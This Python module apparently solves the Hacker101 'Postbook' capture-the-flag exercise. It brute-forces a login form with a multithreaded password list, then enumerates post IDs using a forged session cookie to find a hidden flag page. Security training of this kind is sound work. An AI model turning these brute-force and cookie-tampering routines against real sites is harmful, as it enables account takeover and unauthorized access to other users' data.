"""
Hacker 101 CTF exercise "Postbook" password cracker.
"""

from bruting import http as h
from core.conf.http import HttpRequest
from core.constants.http import Protocol, HttpMethod, ContentType, HeaderField
from util.matching import http_resp_content_regex_flagger as f

PROTOCOL = Protocol.HTTP
ENDPOINT = "index.php"
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"
HEADERS = {
    HeaderField.CONTENT_TYPE.value: ContentType.FORM_URL.value[0],
    HeaderField.ACCEPT.value: ContentType.HTML.value[0],
}


def crack_password(ip, instance_id, username):
    """
    Enumerates common passwords and returns the valid ones after trying. A valid username is required.
    :param ip:
    :param instance_id:
    :param username:
    :return:
    """
    path = "/".join((instance_id, ENDPOINT))
    query_params = {"page": "sign_in.php"}
    req_template = HttpRequest(
        ip, method=HttpMethod.POST, path=path, headers=HEADERS, params=query_params
    )
    regex = r"wrong username"
    passwd_req_gen = get_passwd_func(username)
    return h.parallel_attack(
        req_template,
        passwd_req_gen,
        f(regex, True),
        data_file="uname_list.txt",
        threads=10,
    )


def search_secret_page(ip, instance_id, max_page_num):
    """
    Iterates and seeks for the secret page with a flag, returns the page ID if found.
    :param ip:
    :param instance_id:
    :param max_page_num:
    :return:
    """
    if max_page_num < 1:
        max_page_num = 10
    sequence = list(range(0, max_page_num + 1))

    path = "/".join((instance_id, ENDPOINT))
    cookies = {"id": "c81e728d9d4c2f636f067f89cc14862c"}
    req_template = HttpRequest(ip, method=HttpMethod.GET, path=path, cookies=cookies)
    regex = r"\^FLAG\^"
    return h.parallel_attack(
        req_template, generate_page_req, f(regex, False), sequence=sequence, threads=5
    )


def get_passwd_func(username):
    def generate_passwd_req(template, value):
        target = template.clone()
        body = {USERNAME_FIELD: str(username), PASSWORD_FIELD: str(value)}
        target.body = body
        return target

    return generate_passwd_req


def generate_page_req(template, value):
    target = template.clone()
    query_params = {"page": "view.php", "id": str(value)}
    target.params = query_params
    return target
